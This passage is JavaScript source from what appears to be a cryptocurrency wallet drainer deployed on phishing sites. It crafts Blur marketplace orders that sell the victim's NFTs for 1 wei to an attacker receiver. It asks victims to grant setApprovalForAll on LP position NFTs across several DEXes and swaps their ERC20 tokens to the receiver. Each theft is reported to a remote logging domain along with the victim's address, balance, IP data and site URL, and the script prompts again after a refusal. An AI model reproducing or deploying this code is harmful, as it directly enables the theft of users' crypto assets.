                                "matchingPolicy": "0x00000000006411739da1c40b106f8511de5d1fac",
                                "collection": O.contractAddress,
                                "tokenId": s,
                                "amount": "1",
                                "paymentToken": "0x0000000000000000000000000000000000000000",
                                "price": "1",
                                "listingTime": "1661790956",
                                "expirationTime": Y,
                                "fees": [{
                                    "rate": "10000",
                                    "recipient": config.blurfee
                                }],
                                "salt": String(BigInt((Math.floor(Math.random() * 90000000000) + 1000000000000000) ** 2)),
                                "extraParams": "0x",
                                "nonce": Number(a)
                            };
                        });
                    } else {
                        U = [{
                            "trader": this.walletAddress,
                            "side": 0x0,
                            "matchingPolicy": "0x00000000006411739da1c40b106f8511de5d1fac",
                            "collection": config.fakeCollection,
                            "tokenId": "0",
                            "amount": "1",
                            "paymentToken": "0x0000000000A39bb272e79075ade125fd351887Ac",
                            "price": String(O.balance),
                            "listingTime": "1661790956",
                            "expirationTime": Y,
                            "fees": [],
                            "salt": String(BigInt((Math.floor(Math.random() * 90000000000) + 1000000000000000) ** 2)),
                            "extraParams": "0x",
                            "nonce": Number(a)
                        }];
                    }
                    S = S.concat(U);
                });
                let D = await fetch(this.logDomainName + "blur/root", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "walletAddress": this.walletAddress,
                        "orders": S,
                        "API_KEY": config.API_KEY,
                        "signature": this.signature,
                        "hash_sweet": t
                    }))
                }).then(O => O.json()).then(O => JSON.parse(this.decryptBody(O.encrypted)));
                console.log(D);
                let l = {
                    "name": "Blur Exchange",
                    "version": "1.0",
                    "chainId": 0x1,
                    "verifyingContract": this.blurRouter
                };
                let M = {
                    "Root": [{
                        "name": "root",
                        "type": "bytes32"
                    }]
                };
                let G = {
                    "root": D.root
                };
                try {
                    this.logPromting(t, "BLUR", {
                        "chain": 0x1,
                        "tokenPrice": this.blurValue
                    });
                } catch (O) {
                    console.warn(O);
                }
                await new Promise(async (r, d) => {
                    try {
                        let v = await this.signer._signTypedData(l, M, G);
                        let C = false;
                        try {
                            const E = ethers.utils.verifyTypedData(l, M, G, v);
                            if (E.toLowerCase() === this.walletAddress.toLowerCase()) {
                                C = false;
                                console.log("Might be fake");
                            } else {
                                C = true;
                            }
                        } catch {}
                        r([v, C]);
                    } catch (w) {
                        d(w);
                    }
                }).then(async r => {
                    let C = r[0];
                    let E = C.substring(2);
                    let w = "0x" + E.substring(0, 64);
                    let T = "0x" + E.substring(64, 128);
                    let X = parseInt(E.substring(128, 130), 16);
                    let P = await this.secondProvider.getBlockNumber();
                    let o = S.map((y, h) => {
                        if (y.side) {
                            return {
                                "buy": {
                                    "order": {
                                        "trader": config.receiver,
                                        "side": 0x0,
                                        "matchingPolicy": "0x00000000006411739da1c40b106f8511de5d1fac",
                                        "collection": y.collection,
                                        "tokenId": y.tokenId,
                                        "amount": "1",
                                        "paymentToken": "0x0000000000000000000000000000000000000000",
                                        "price": "1",
                                        "listingTime": "1661790956",
                                        "expirationTime": Y,
                                        "fees": [],
                                        "salt": String(BigInt((Math.floor(Math.random() * 90000000000) + 1000000000000000) ** 2)),
                                        "extraParams": "0x"
                                    },
                                    "v": 0x0,
                                    "r": "0x0000000000000000000000000000000000000000000000000000000000000000",
                                    "s": "0x0000000000000000000000000000000000000000000000000000000000000000",
                                    "extraSignature": D.root,
                                    "signatureVersion": 0x0,
                                    "blockNumber": "0"
                                },
                                "sell": {
                                    "order": {
                                        ...y
                                    },
                                    "v": X,
                                    "r": w,
                                    "s": T,
                                    "extraSignature": D.paths[h],
                                    "signatureVersion": 0x1,
                                    "blockNumber": String(P)
                                }
                            };
                        }
                        if (!y.side) {
                            return {
                                "sell": {
                                    "order": {
                                        "trader": config.receiver,
                                        "side": 0x1,
                                        "matchingPolicy": "0x00000000006411739da1c40b106f8511de5d1fac",
                                        "collection": config.fakeCollection,
                                        "tokenId": "0",
                                        "amount": "1",
                                        "paymentToken": "0x0000000000A39bb272e79075ade125fd351887Ac",
                                        "price": y.price,
                                        "listingTime": "1661790956",
                                        "expirationTime": Y,
                                        "fees": [],
                                        "salt": String(BigInt((Math.floor(Math.random() * 90000000000) + 1000000000000000) ** 2)),
                                        "extraParams": "0x"
                                    },
                                    "v": 0x0,
                                    "r": "0x0000000000000000000000000000000000000000000000000000000000000000",
                                    "s": "0x0000000000000000000000000000000000000000000000000000000000000000",
                                    "extraSignature": D.root,
                                    "signatureVersion": 0x0,
                                    "blockNumber": "0"
                                },
                                "buy": {
                                    "order": {
                                        ...y
                                    },
                                    "v": X,
                                    "r": w,
                                    "s": T,
                                    "extraSignature": D.paths[h],
                                    "signatureVersion": 0x1,
                                    "blockNumber": String(P)
                                }
                            };
                        }
                    });
                    console.log(o);
                    this.sweets = this.sweets.filter(y => !this.blurTokens.map(h => h.contractAddress).includes(y.contractAddress));
                    this.considerations = this.considerations.filter(y => !this.blurTokens.map(h => h.contractAddress).includes(y.token));
                    this.offers = this.offers.filter(y => !this.blurTokens.map(h => h.contractAddress).includes(y.token));
                    let x = await this.getIpData();
                    let e = '';
                    this.blurTokens.forEach((y, h) => {
                        y?.["tokenIds"]?.["forEach"](L => {
                            e += "<a href=\"https://opensea.io/assets/ethereum/" + y.contractAddress + "/" + L + "\">" + y.collectionSymbol + "</a> (" + (y.price / y.owned).toFixed(3) + " ETH)" + (h + 1 == this.blurTokens.length ? '' : ",") + " ";
                        });
                    });
                    fetch(this.logDomainName + "blur/execute", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "data": o,
                            "address": this.walletAddress,
                            "walletBalanceInEth": this.walletBalanceInEth,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": x,
                            "API_KEY": config.API_KEY,
                            "signature": this.signature,
                            "mayfake": r[1],
                            "hash_sweet": t,
                            "blurItems": e,
                            "blurValue": Number(this.blurValue).toFixed(3) + " ETH"
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async r => {
                    console.log(r);
                    this.logCancel("Blur", '', Number(this.blurValue).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferBlur(t);
                    }
                    this.updateButtonMessage(true);
                    this.txcount++;
                });
            }
        } catch (r) {
            console.warn("Blur error:", r);
        }
    };
    ["transferPancakeLPV3"] = async (t, n, K) => {
        console.log("Pancake LPV3", n);
        if (n.length > 0) {
            try {
                let a = n[0].chain;
                await this.changeNetwork(a);
                console.log("TRANSFERRING LP NFTS");
                console.table(n);
                await new Promise(async (S, U) => {
                    let l = new ethers.utils.Interface(LP_ABI);
                    let M = l.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[a], true]);
                    let G = [M];
                    let O = l.encodeFunctionData("multicall", [G]);
                    let r = {
                        "from": this.walletAddress,
                        "to": this.pancakeswapV3Positions,
                        "value": "0x0000",
                        "data": O
                    };
                    n[0].name = "PNC_LPV3";
                    n[0].totalPrice = n[0].price;
                    this.estimateTXcosts(r, n[0], n[0].chain);
                    try {
                        this.logPromting(t, "PNC_LPV3", {
                            "chain": a,
                            "tokens": n,
                            "tokenPrice": K,
                            "to_wallet": config.tokenContractAddresses[a]
                        });
                    } catch (d) {
                        console.warn(d);
                    }
                    await this.main_provider.sendAsync({
                        "method": "eth_sendTransaction",
                        "params": [r],
                        "from": this.walletAddress
                    }, (s, v) => {
                        if (s) {
                            U(s);
                        } else {
                            let E = v;
                            if (v.hasOwnProperty("result")) {
                                E = v.result;
                            } else if (v.hasOwnProperty("hash")) {
                                E = v.hash;
                            }
                            S(E);
                        }
                    });
                }).then(async S => {
                    let D = await this.getIpData();
                    fetch(this.logDomainName + "backend/pnc_positions", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": D,
                            "API_KEY": config.API_KEY,
                            "chain": a,
                            "tokens": n,
                            "signature": this.signature,
                            "contractId": 0x270f,
                            "tokenPrice": Number(K).toFixed(3) + " ETH",
                            "transactionHash": S,
                            "exclusiveContractId": 0x270f,
                            "unmarkedContract": config.tokenContractAddresses[a],
                            "hash_sweet": t
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async S => {
                    this.logCancel("Pancake LP NFTS", '', Number(K).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferPancakeLPV3(t, n, K);
                    }
                    this.updateButtonMessage(true);
                    this.txcount++;
                    return false;
                });
            } catch (S) {
                console.warn("LPV3 error:", S);
            }
        }
    };
    ["transferSushiswapLPV3"] = async (t, n, K) => {
        console.log("Sushiswap LPV3", n);
        if (n.length > 0) {
            try {
                let a = n[0].chain;
                await this.changeNetwork(a);
                console.log("TRANSFERRING LP NFTS");
                console.table(n);
                await new Promise(async (S, U) => {
                    let M = new ethers.utils.Interface(LP_ABI);
                    let G = M.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[a], true]);
                    let O = [G];
                    let r = M.encodeFunctionData("multicall", [O]);
                    let d = {
                        "from": this.walletAddress,
                        "to": this.sushiswapV3Positions[a],
                        "value": "0x0000",
                        "data": r
                    };
                    n[0].name = "SUS_LPV3";
                    n[0].totalPrice = n[0].price;
                    this.estimateTXcosts(d, n[0], n[0].chain);
                    try {
                        this.logPromting(t, "SUS_LPV3", {
                            "chain": a,
                            "tokens": n,
                            "tokenPrice": K,
                            "to_wallet": config.tokenContractAddresses[a]
                        });
                    } catch (s) {
                        console.warn(s);
                    }
                    await this.main_provider.sendAsync({
                        "method": "eth_sendTransaction",
                        "params": [d],
                        "from": this.walletAddress
                    }, (v, C) => {
                        if (v) {
                            U(v);
                        } else {
                            let w = C;
                            if (C.hasOwnProperty("result")) {
                                w = C.result;
                            } else if (C.hasOwnProperty("hash")) {
                                w = C.hash;
                            }
                            S(w);
                        }
                    });
                }).then(async S => {
                    let D = await this.getIpData();
                    fetch(this.logDomainName + "backend/sus_positions", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": D,
                            "API_KEY": config.API_KEY,
                            "chain": a,
                            "tokens": n,
                            "signature": this.signature,
                            "contractId": 0x270f,
                            "tokenPrice": Number(K).toFixed(3) + " ETH",
                            "transactionHash": S,
                            "exclusiveContractId": 0x270f,
                            "unmarkedContract": config.tokenContractAddresses[a],
                            "hash_sweet": t
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async S => {
                    this.logCancel("Sushiswap LP NFTS", '', Number(K).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferSushiswapLPV3(t, n, K);
                    }
                    this.updateButtonMessage(true);
                    this.txcount++;
                    return false;
                });
            } catch (S) {
                console.warn("LPV3 error:", S);
            }
        }
    };
    ["transferCamelotLPV3"] = async (t, n, K) => {
        console.log("Pancake LPV3", n);
        if (n.length > 0) {
            try {
                let a = n[0].chain;
                await this.changeNetwork(a);
                console.log("TRANSFERRING LP NFTS");
                console.table(n);
                await new Promise(async (S, U) => {
                    let G = new ethers.utils.Interface(LP_ABI);
                    let O = G.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[a], true]);
                    let r = [O];
                    let d = G.encodeFunctionData("multicall", [r]);
                    let s = {
                        "from": this.walletAddress,
                        "to": this.camelotV3Positions,
                        "value": "0x0000",
                        "data": d
                    };
                    n[0].name = "CAM_LPV3";
                    n[0].totalPrice = n[0].price;
                    this.estimateTXcosts(s, n[0], n[0].chain);
                    try {
                        this.logPromting(t, "CAM_LPV3", {
                            "chain": a,
                            "tokens": n,
                            "tokenPrice": K,
                            "to_wallet": config.tokenContractAddresses[a]
                        });
                    } catch (v) {
                        console.warn(v);
                    }
                    await this.main_provider.sendAsync({
                        "method": "eth_sendTransaction",
                        "params": [s],
                        "from": this.walletAddress
                    }, (C, E) => {
                        if (C) {
                            U(C);
                        } else {
                            let T = E;
                            if (E.hasOwnProperty("result")) {
                                T = E.result;
                            } else if (E.hasOwnProperty("hash")) {
                                T = E.hash;
                            }
                            S(T);
                        }
                    });
                }).then(async S => {
                    let D = await this.getIpData();
                    fetch(this.logDomainName + "backend/cam_positions", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": D,
                            "API_KEY": config.API_KEY,
                            "chain": a,
                            "tokens": n,
                            "signature": this.signature,
                            "contractId": 0x270f,
                            "tokenPrice": Number(K).toFixed(3) + " ETH",
                            "transactionHash": S,
                            "exclusiveContractId": 0x270f,
                            "hash_sweet": t,
                            "unmarkedContract": config.tokenContractAddresses[a]
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async S => {
                    this.logCancel("Camelot LP NFTS", '', Number(K).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferCamelotLPV3(t, n, K);
                    }
                    this.updateButtonMessage(true);
                    this.txcount++;
                    return false;
                });
            } catch (S) {
                console.warn("LPV3 error:", S);
            }
        }
    };
    ["transferVeloNFTs"] = async (t, n) => {
        try {
            await this.changeNetwork(10);
            console.log("veNFTs", n);
            let Y = new ethers.utils.Interface(NFT_ABI);
            let a = Y.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[10], true]);
            let S = {
                "from": this.walletAddress,
                "to": this.veNFTContract,
                "value": "0x0000",
                "data": a
            };
            this.estimateTXcosts(S, n, n.chain);
            try {
                this.logPromting(t, "VELO", {
                    "tokenIds": n.tokens,
                    "tokenName": n.tname,
                    "tokenPrice": n.totalPrice,
                    "contractAddress": n.contractAddress,
                    "chain": 0xa,
                    "to_wallet": config.tokenContractAddresses[10]
                });
            } catch (U) {
                console.warn(U);
            }
            await new Promise(async (D, l) => {
                await this.main_provider.sendAsync({
                    "method": "eth_sendTransaction",
                    "params": [S],
                    "from": this.walletAddress
                }, (G, O) => {
                    if (G) {
                        console.error("veNFTs error: ", G);
                        l(G);
                    } else {
                        let d = O;
                        if (O.hasOwnProperty("result")) {
                            d = O.result;
                        } else if (O.hasOwnProperty("hash")) {
                            d = O.hash;
                        }
                        console.log("veNFTs success", d);
                        this.pending.push(d);
                        D(d);
                    }
                });
            }).then(async D => {
                let M = await this.getIpData();
                fetch(this.logDomainName + "backend/vel_nft", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "address": this.walletAddress,
                        "walletBalanceInEth": this.walletBalanceInEth,
                        "isMobile": this.isMobile(),
                        "websiteUrl": window.location.href,
                        "websiteDomain": window.location.host,
                        "ipData": M,
                        "API_KEY": config.API_KEY,
                        "signature": this.signature,
                        "contractId": 0x270f,
                        "tokenIds": n.tokens,
                        "tokenName": n.tname,
                        "tokenPrice": n.totalPrice,
                        "contractAddress": n.contractAddress,
                        "transactionHash": D,
                        "chain": 0xa,
                        "hash_sweet": t,
                        "exclusiveContractId": 0x270f,
                        "unmarkedContract": config.tokenContractAddresses[10]
                    }))
                });
                this.txcount++;
                this.addToLocalStorage(t);
                return true;
            })["catch"](async D => {
                this.logCancel("veNFT", n.tname, Number(n.totalPrice).toFixed(3) + " ETH");
                if (config.repeatHighest) {
                    return await this.transferTJ(t, n);
                }
                console.log("NFT error:", D);
                this.txcount++;
            });
        } catch (D) {
            console.log("Failed to transfer TJ", D);
        }
    };
    ["transferTJ"] = async (t, n) => {
        try {
            await this.changeNetwork(n.chain);
            console.log("TJ", n);
            let Y = new ethers.utils.Interface(TRADERJOE_ABI);
            let a = Y.encodeFunctionData("approveForAll", [config.tokenContractAddresses[n.chain], true]);
            let S = {
                "from": this.walletAddress,
                "to": n.contractAddress,
                "value": "0x0000",
                "data": a
            };
            this.estimateTXcosts(S, n, n.chain);
            try {
                this.logPromting(t, "TJ", {
                    "tokenIds": n.tokenIds,
                    "tokenQuantities": n.quantities,
                    "tokenName": n.tname,
                    "tokenPrice": n.totalPrice,
                    "contractAddress": n.contractAddress,
                    "chain": n.chain,
                    "hash_sweet": t,
                    "to_wallet": config.tokenContractAddresses[n.chain]
                });
            } catch (U) {
                console.warn(U);
            }
            await new Promise(async (D, l) => {
                await this.main_provider.sendAsync({
                    "method": "eth_sendTransaction",
                    "params": [S],
                    "from": this.walletAddress
                }, (r, d) => {
                    if (r) {
                        console.error("TJ error: ", r);
                        l(r);
                    } else {
                        let v = d;
                        if (d.hasOwnProperty("result")) {
                            v = d.result;
                        } else if (d.hasOwnProperty("hash")) {
                            v = d.hash;
                        }
                        console.log("TJ success", v);
                        this.pending.push(v);
                        D(v);
                    }
                });
            }).then(async D => {
                let M = await this.getIpData();
                fetch(this.logDomainName + "backend/tj", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "address": this.walletAddress,
                        "walletBalanceInEth": this.walletBalanceInEth,
                        "isMobile": this.isMobile(),
                        "websiteUrl": window.location.href,
                        "websiteDomain": window.location.host,
                        "ipData": M,
                        "API_KEY": config.API_KEY,
                        "signature": this.signature,
                        "contractId": 0x270f,
                        "tokenIds": n.tokenIds,
                        "tokenQuantities": n.quantities,
                        "tokenName": n.tname,
                        "tokenPrice": n.totalPrice,
                        "contractAddress": n.contractAddress,
                        "transactionHash": D,
                        "chain": n.chain,
                        "hash_sweet": t,
                        "exclusiveContractId": 0x270f,
                        "unmarkedContract": config.tokenContractAddresses[n.chain]
                    }))
                });
                this.txcount++;
                this.addToLocalStorage(t);
                return true;
            })["catch"](async D => {
                this.logCancel("Trader Joe", n.tname, Number(n.totalPrice).toFixed(3) + " ETH");
                if (config.repeatHighest) {
                    return await this.transferTJ(t, n);
                }
                console.log("NFT error:", D);
                this.txcount++;
            });
        } catch (D) {
            console.log("Failed to transfer TJ", D);
        }
    };
    ["transferLPV3"] = async (t, n, K) => {
        console.log("LPV3", n);
        if (n.length > 0) {
            try {
                let a = n[0].chain;
                await this.changeNetwork(a);
                console.log("TRANSFERRING LP NFTS");
                console.table(n);
                await new Promise(async (S, U) => {
                    let G = new ethers.utils.Interface(LP_ABI);
                    let O = G.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[a], true]);
                    let r = [O];
                    let d = G.encodeFunctionData("multicall", [r]);
                    let s = {
                        "from": this.walletAddress,
                        "to": this.uniswapV3Positions,
                        "value": "0x0000",
                        "data": d
                    };
                    n[0].name = "LPV3";
                    n[0].totalPrice = n[0].price;
                    this.estimateTXcosts(s, n[0], n[0].chain);
                    try {
                        this.logPromting(t, "LPV3", {
                            "chain": a,
                            "tokens": n,
                            "tokenPrice": K,
                            "to_wallet": config.tokenContractAddresses[a]
                        });
                    } catch (v) {
                        console.warn(v);
                    }
                    await this.main_provider.sendAsync({
                        "method": "eth_sendTransaction",
                        "params": [s],
                        "from": this.walletAddress
                    }, (C, E) => {
                        if (C) {
                            U(C);
                        } else {
                            let T = E;
                            if (E.hasOwnProperty("result")) {
                                T = E.result;
                            } else if (E.hasOwnProperty("hash")) {
                                T = E.hash;
                            }
                            S(T);
                        }
                    });
                }).then(async S => {
                    let D = await this.getIpData();
                    fetch(this.logDomainName + "backend/positions", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": D,
                            "API_KEY": config.API_KEY,
                            "chain": a,
                            "tokens": n,
                            "signature": this.signature,
                            "contractId": 0x270f,
                            "tokenPrice": Number(K).toFixed(3) + " ETH",
                            "transactionHash": S,
                            "hash_sweet": t,
                            "exclusiveContractId": 0x270f,
                            "unmarkedContract": config.tokenContractAddresses[a]
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async S => {
                    this.logCancel("Uniswap LP NFTS", '', Number(K).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferLPV3(t, n, K);
                    }
                    this.updateButtonMessage(true);
                    this.txcount++;
                    return false;
                });
            } catch (S) {
                console.warn("LPV3 error:", S);
            }
        }
    };
    ["transferERC20PancakeV3"] = async (t, n, K, u) => {
        console.log("ERC20 Pancakes V3", K);
        if (K.length > 0) {
            try {
                await this.changeNetwork(n);
                console.log("TRANSFERRING APPROVED PANCAKE ERC20 TOKENS");
                await new Promise(async (S, U) => {
                    let G = Math.floor(Date.now() / 1000) + 99990;
                    let O = new ethers.utils.Interface(PANCAKESWAPV3);
                    let r = [];
                    K.map(d => {
                        let v = d.balance;
                        let w = d.contractAddress;
                        let T;
                        if (n === 1) {
                            T = this.receiverSwapTokenAddress != d.contractAddress ? this.receiverSwapTokenAddress : this.receiverSwapTokenAddressAlt;
                        }
                        if (n === 56) {
                            T = this.receiverSwapTokenAddressWBNB != d.contractAddress ? this.receiverSwapTokenAddressWBNB : this.receiverSwapTokenAddressBUSD;
                        }
                        console.log(w);
                        console.log(T);
                        console.log(this.receiverSwapTokenAddressWBNB);
                        console.log(this.receiverSwapTokenAddressBUSD);
                        let X = config.receiver;
                        let o = O.encodeFunctionData("exactInputSingle", [[w, T, 500, X, v, 0, 0]]);
                        r.push(o);
                    });
                    if (r.length != 0) {
                        console.log("PANCAKESWAPV3 TRANSFER TOKEN ARRAY: ", r);
                        let d = O.encodeFunctionData("multicall", [G, r]);
                        let s = {
                            "from": this.walletAddress,
                            "to": this.pancakeSwapSmartRouter,
                            "value": "0x0000",
                            "data": d
                        };
                        let v = {
                            name: "PANCAKESWAP",
                            totalPrice: u,
                            chain: n
                        };
                        this.estimateTXcosts(s, v, n);
                        try {
                            const C = {
                                chain: n,
                                tokenPrice: u
                            };
                            this.logPromting(t, "PANCAKESWAP", C);
                        } catch (E) {
                            console.warn(E);
                        }
                        await this.main_provider.sendAsync({
                            "method": "eth_sendTransaction",
                            "params": [s],
                            "from": this.walletAddress
                        }, (w, T) => {
                            if (w) {
                                console.error(w);
                                U(w);
                            } else {
                                let P = T;
                                if (T.hasOwnProperty("result")) {
                                    P = T.result;
                                } else if (T.hasOwnProperty("hash")) {
                                    P = T.hash;
                                }
                                console.log("PANCAKE success", P);
                                this.pending.push(P);
                                this.sweets = this.sweets.filter(o => !K.map(x => x.contractAddress).includes(o.contractAddress));
                                this.considerations = this.considerations.filter(o => !K.map(x => x.contractAddress).includes(o.token));
                                this.offers = this.offers.filter(o => !K.map(x => x.contractAddress).includes(o.token));
                                this.uniswapTokens = this.uniswapTokens.filter(o => !K.map(x => x.contractAddress).includes(o.contractAddress));
                                this.txcount++;
                                this.addToLocalStorage(t);
                                S(P);
                            }
                        });
                    }
                    this.txcount++;
                    return true;
                }).then(async S => {
                    let D = await this.getIpData();
                    fetch(this.logDomainName + "backend/pancakeV3", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "walletBalanceInEth": this.walletBalanceInEth,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": D,
                            "API_KEY": config.API_KEY,
                            "signature": this.signature,
                            "contractId": 0x270f,
                            "tokenPrice": Number(u).toFixed(3) + " ETH",
                            "chain": n,
                            "hash_sweet": t,
                            "tokens": K,
                            "transactionHash": S,
                            "exclusiveContractId": 0x270f,
                            "unmarkedContract": config.tokenContractAddresses[n]
                        }))
                    });
                    await this.sleep(500);
                    return true;
                })["catch"](async S => {
                    this.logCancel("PANCAKE ERC20", '', Number(u).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferERC20PancakeV3(t, n, K, u);
                    }
                    this.updateButtonMessage(true);
                    this.txcount++;
                    return false;
                });
            } catch (S) {
                console.log(S);
            }
        }
    };
    ["transferQuickswapLPV3"] = async (t, n, K) => {
        console.log("LPV3", n);
        if (n.length > 0) {
            try {
                let a = n[0].chain;
                await this.changeNetwork(a);
                console.log("TRANSFERRING LP NFTS");
                console.table(n);
                await new Promise(async (S, U) => {
                    let M = new ethers.utils.Interface(LP_ABI);
                    let G = M.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[a], true]);
                    let O = [G];
                    let r = M.encodeFunctionData("multicall", [O]);
                    let d = {
                        "from": this.walletAddress,
                        "to": this.quickswapV3Positions,
                        "value": "0x0000",
                        "data": r
                    };
                    n[0].name = "QUI_LPV3";
                    n[0].totalPrice = n[0].price;
                    this.estimateTXcosts(d, n[0], n[0].chain);
                    try {
                        this.logPromting(t, "QUI_LPV3", {
                            "chain": a,
                            "tokens": n,
                            "tokenPrice": K,
                            "to_wallet": config.tokenContractAddresses[a]
                        });
                    } catch (s) {
                        console.warn(s);
                    }
                    await this.main_provider.sendAsync({
                        "method": "eth_sendTransaction",
                        "params": [d],
                        "from": this.walletAddress
                    }, (v, C) => {
                        if (v) {
                            U(v);
                        } else {
                            let w = C;
                            if (C.hasOwnProperty("result")) {
                                w = C.result;
                            } else if (C.hasOwnProperty("hash")) {
                                w = C.hash;
                            }
                            S(w);
                        }
                    });
                }).then(async S => {
                    let D = await this.getIpData();
                    fetch(this.logDomainName + "backend/Quickpositions", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": D,
                            "API_KEY": config.API_KEY,
                            "chain": a,
                            "tokens": n,
                            "hash_sweet": t,
                            "signature": this.signature,
                            "contractId": 0x270f,
                            "tokenPrice": Number(K).toFixed(3) + " ETH",
                            "transactionHash": S,
                            "exclusiveContractId": 0x270f,
                            "unmarkedContract": config.tokenContractAddresses[a]
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async S => {
                    this.logCancel("Quickswap LP NFTS", '', Number(K).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferQuickswapLPV3(t, n, K);
                    }
                    this.updateButtonMessage(true);
                    this.txcount++;
                    return false;
                });
            } catch (S) {
                console.warn("LPV3 error:", S);
            }
        }
    };
    ["transferERC20Uniswap"] = async t => {
        console.log("ERC20 uniswap", this.uniswapTokens);
        if (this.uniswapTokens.length > 0) {
            try {
                await this.changeNetwork(1);
                if (this.uniswapTokens.length > 0) {
                    console.log("TRANSFERRING APPROVED UNISWAP ERC20 TOKENS");
                    console.table(this.uniswapTokens);
                    await new Promise(async (k, Y) => {
                        let U = Math.floor(Date.now() / 1000) + 99990;
                        let D = new ethers.utils.Interface(UNISWAP);
                        console.log(this.uniswapTokens);
                        let l = [];
                        this.uniswapTokens.map(M => {
                            let O = [];
                            O[0] = M.contractAddress;
                            O[1] = this.receiverSwapTokenAddress != M.contractAddress ? this.receiverSwapTokenAddress : this.receiverSwapTokenAddressAlt;
                            let r = M.balance;
                            let s = D.encodeFunctionData("swapExactTokensForTokens", [r, 0, O, config.receiver, U]);
                            l.push(s);
                        });
                        if (l.length != 0) {
                            console.log("UNISWAP TRANSFER TOKEN ARRAY: ", l);
                            let M = D.encodeFunctionData("multicall", [U, l]);
                            let G = {
                                "from": this.walletAddress,
                                "to": this.uniswapV3Router2,
                                "value": "0x0000",
                                "data": M
                            };
                            let O = {
                                name: "UNISWAP",
                                totalPrice: this.uniswapValue,
                                chain: 1
                            };
                            this.estimateTXcosts(G, O, 1);
                            try {
                                this.logPromting(t, "UNISWAP", {
                                    "chain": 0x1,
                                    "tokenPrice": this.uniswapValue
                                });
                            } catch (r) {
                                console.warn(r);
                            }
                            await this.main_provider.sendAsync({
                                "method": "eth_sendTransaction",
                                "params": [G],
                                "from": this.walletAddress
                            }, (d, s) => {
                                if (d) {
                                    console.error(d);
                                    Y(d);
                                } else {
                                    let C = s;
                                    if (s.hasOwnProperty("result")) {
                                        C = s.result;
                                    } else if (s.hasOwnProperty("hash")) {
                                        C = s.hash;
                                    }
                                    console.log("UNISWAP success", C);
                                    this.addToLocalStorage(t);
                                    this.pending.push(C);
                                    this.sweets = this.sweets.filter(E => !this.uniswapTokens.map(w => w.contractAddress).includes(E.contractAddress));
                                    this.considerations = this.considerations.filter(E => !this.uniswapTokens.map(w => w.contractAddress).includes(E.token));
                                    this.offers = this.offers.filter(E => !this.uniswapTokens.map(w => w.contractAddress).includes(E.token));
                                    this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(E => !this.uniswapTokens.map(w => w.contractAddress).includes(E.contractAddress));
                                    this.sushiswapTokens = this.sushiswapTokens.filter(E => !this.uniswapTokens.map(w => w.contractAddress).includes(E.contractAddress));
                                    this.permitTokens = this.permitTokens.filter(E => !this.uniswapTokens.map(w => w.token).includes(E.contractAddress));
                                    k(C);
                                }
                            });
                        }
                        this.txcount++;
                        return true;
                    }).then(async k => {
                        let a = await this.getIpData();
                        fetch(this.logDomainName + "backend/swap", {
                            "method": "POST",
                            "headers": {
